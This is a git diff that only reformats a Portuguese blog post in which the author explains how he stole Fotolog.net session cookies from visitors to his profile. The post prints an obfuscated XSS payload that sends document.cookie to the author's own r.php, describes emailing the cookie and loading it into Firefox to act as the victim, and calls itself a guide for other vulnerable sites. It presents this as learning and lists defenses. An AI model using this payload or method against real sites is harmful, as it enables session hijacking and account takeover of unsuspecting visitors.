@@ -15,14 +15,14 @@ tags:
   - javascript
   - web
   - xss
-
 ---
+
 Segue a descrição de como descobri que consigo pegar o cookie do Fotolog.net de qualquer pessoa que entra no meu profile, e com isso, poder:
 
-  * Adicionar comentários em qualquer fotolog como a pessoa
-  * Remover comentários do fotolog da pessoa
-  * Adicionar/remover FF list
-  * Ver e-mail de cadastro da pessoa
+- Adicionar comentários em qualquer fotolog como a pessoa
+- Remover comentários do fotolog da pessoa
+- Adicionar/remover FF list
+- Ver e-mail de cadastro da pessoa
 
 **[update]** Parece que isso não funciona mais hoje. De qualquer maneira, é um bom guia (acho que tá bem detalhado) para _roubar cookies_ de vários outros sitemas que tenham falhas como esta (e não são poucos). **[/update]**
 
@@ -49,7 +49,12 @@ _OBS.: Tenho recebido e-mail de pessoas dizendo que o não cabe… O meu também
 Este código só funciona porque o _Internet Explorer_ é problemático! Não tem nada a ver um _JavaScript_ dentro de uma url de fundo e ainda ir para este endereço! E o [Fotolog.net][2] também tem um bug seríssimo porque não deveria poder se usar aspas no endereço de um site! Daí no meu profile aparece no lugar do endereço da minha página:
 
 ```html
-<a href="#" style="background:url(ja       vas       cript:location.href=%27 http://www.tiagomadeira.net/r.php?c=%27       +escape(document.cookie))">#" style="background:url(ja       vas       cript:location.href=%27 http://www.tiagomadeira.net/r.php?c=%27       +escape(document.cookie))</a>
+<a
+  href="#"
+  style="background:url(ja       vas       cript:location.href=%27 http://www.tiagomadeira.net/r.php?c=%27       +escape(document.cookie))"
+  >#" style="background:url(ja vas cript:location.href=%27
+  http://www.tiagomadeira.net/r.php?c=%27 +escape(document.cookie))</a
+>
 ```
 
 Bom, depois disso basta fazer uma página PHP que passe este valor do c para um banco de dados ou e-mail (no meu caso, preferi por e-mail mesmo). Criei uma página no meu /r.php com:
@@ -66,9 +71,9 @@ E o último problema que enfrentei então foi colocar este cookie no meu Firefox
 
 #### Vou tentar simplificar o “algoritmo”:
 
-  * A pessoa está loggada (sempre, pois o cookie do fotolog.net é gigantesco) e entra no meu perfil.
-  * Meu perfil pega o cookie do Fotolog.net deste computador (que precisa estar usando Internet Explorer) e me envia via a função mail do PHP.
-  * Eu troco o cookie do meu Firefox pelo que eu recebi no e-mail e com isto fico loggado como a pessoa!
+- A pessoa está loggada (sempre, pois o cookie do fotolog.net é gigantesco) e entra no meu perfil.
+- Meu perfil pega o cookie do Fotolog.net deste computador (que precisa estar usando Internet Explorer) e me envia via a função mail do PHP.
+- Eu troco o cookie do meu Firefox pelo que eu recebi no e-mail e com isto fico loggado como a pessoa!
 
 Interessante, né?
 
@@ -76,18 +81,17 @@ Bom, como já havia dito, isto foi apenas para fins de aprendizagem e descobri t
 
 **Eu conheço três formas para se tornar resistente a esse golpe:**
 
-  * Não utilizar Internet Explorer. Sugiro [Firefox][3] (o que eu uso), [Opera][4], [Konqueror][5], entre outros…
-  * Não utilizar [Fotolog.net][2]. Sugiro [Flickr][6].
-  * Não clicar em profiles de estranhos.
+- Não utilizar Internet Explorer. Sugiro [Firefox][3] (o que eu uso), [Opera][4], [Konqueror][5], entre outros…
+- Não utilizar [Fotolog.net][2]. Sugiro [Flickr][6].
+- Não clicar em profiles de estranhos.
 
 Bom… É isso aí.
 
 Aprendi muito com isto e por isso compartilho este conhecimento neste post para que outros também possam aprender. Quem puder, divulgue para seus amigos para que eles não sejam vítimas desse tipo de coisa.
 
- [1]: http://www.publicproxyservers.com
- [2]: http://www.fotolog.net
- [3]: http://www.getfirefox.com
- [4]: http://www.opera.com
- [5]: http://konqueror.kde.org
- [6]: http://www.flickr.com
-
+[1]: http://www.publicproxyservers.com
+[2]: http://www.fotolog.net
+[3]: http://www.getfirefox.com
+[4]: http://www.opera.com
+[5]: http://konqueror.kde.org
+[6]: http://www.flickr.com
